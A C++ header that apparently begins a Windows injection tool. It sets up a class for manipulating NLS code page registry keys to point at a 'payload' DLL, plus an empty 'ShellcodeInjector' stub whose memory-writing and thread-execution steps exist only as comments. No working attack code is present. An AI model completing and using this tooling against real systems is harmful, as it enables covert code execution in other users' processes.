#pragma once
#include <string>
#include <vector>
#include <tuple>
#include <initializer_list>
#include <Windows.h>
#include <iostream>
#include <cassert> 

#define MAX_STRING_VALUES 3 
#define MAX_LENGTH_PATH 200

enum class Index : uint32_t
{
    SUBKEY_KEY_VALUE,
    DLL_NAME,
    FULL_PAYLOAD_DLL_PATH
};

enum class CodePageIDIndex : uint32_t 
{
    CodePageInt,
    CodePageHex
};

struct IndexingStringValues
{
    std::wstring StringValues[MAX_STRING_VALUES];
    Index IDs[MAX_STRING_VALUES];
};

class ShellcodeInjector {
public:
    //Methods
    //1.-Create memory and write memory in other process. Allocate contiguous buffer for pointers to the virtual addresses.
    ShellcodeInjector() {

    }
    //Create And Write Memory.
    //void CreateAndWriteMemory(HANDLE hProcess, ) {}
    //2.-Execute thread based on member.

private:
    void** m_pBlocksMemory;
    uint32_t m_numberOfBlocks;
};



typedef class RegistryManipulation
{
public:
    RegistryManipulation(std::initializer_list <std::wstring> l)
    {
        assert(l.size() <= MAX_STRING_VALUES);
        for (auto [i, j] = std::tuple{ 0,  l.begin() }; i < l.size(); i++, j++)
        {
            keyValues.StringValues[i] = *j;
            keyValues.IDs[i] = static_cast<Index>(i);
        }
        hSubkeyNls = NULL;
        m_CodePageIdHex = NULL;
        m_CodePageIdInt = NULL;
        ZeroMemory(&m_procInfo, sizeof(PROCESS_INFORMATION));
    }
    const wchar_t* getStringBuffer(Index i) {
        for (auto index : keyValues.IDs) {
            if (i == index) {
                return keyValues.StringValues[static_cast<uint32_t>(i)].c_str();
            }
        }
        return nullptr;
    }
    bool compareStringEqual(Index i, std::wstring_view s) {
        for (auto index : keyValues.IDs){
            if (i == index) {
                return keyValues.StringValues[static_cast<uint32_t>(i)].compare(s) == 0;
            }
        }
        return false;
    }
    void setStringBuffer(wchar_t* str, Index index) {
        for (auto i : keyValues.IDs) {
            if (i == index) {
                keyValues.StringValues[static_cast<UINT>(i)] = str;
            }
        }
    }
    size_t getStringSize(Index i) {
        for (auto index : keyValues.IDs) {
            if (i == index) {
                return keyValues.StringValues[static_cast<uint32_t>(i)].size() * sizeof(wchar_t);
            }
        }
        return NULL;
    }
    void setCodePageID(uint32_t id, CodePageIDIndex i){
        switch (i){
            case CodePageIDIndex::CodePageInt: {
                m_CodePageIdInt = id;
                break;
            }
            case CodePageIDIndex::CodePageHex:
            {
                m_CodePageIdHex = id;
                break;
            }
            default:
            {
                std::printf("Invalid option for setting m_CodePage\n");
                return;
            }
        }
    }
    uint32_t getCodePageID(CodePageIDIndex i){
        switch (i){
            case CodePageIDIndex::CodePageInt: 
            {
                return m_CodePageIdInt;
            }
            case CodePageIDIndex::CodePageHex:
            {
                return m_CodePageIdHex;
            }
            default:
            {
                std::printf("Invalid option for setting m_CodePage\n");
                return NULL;
            }
        }
    }
    ~RegistryManipulation() {
        for (auto key : keyValues.StringValues) {
            key = L"";
        }
        RegCloseKey(hSubkeyNls);
        hSubkeyNls = NULL;
        ZeroMemory(&m_procInfo, sizeof(PROCESS_INFORMATION));
    }

//public members:
    HKEY hSubkeyNls;
    PROCESS_INFORMATION m_procInfo;
    bool is_created;
private:
    //Same for this one.
    IndexingStringValues keyValues;
    uint32_t m_CodePageIdHex, m_CodePageIdInt;
    //This can be passed as inheritance probably.
    ShellcodeInjector injector;
}*PRegistryKey;
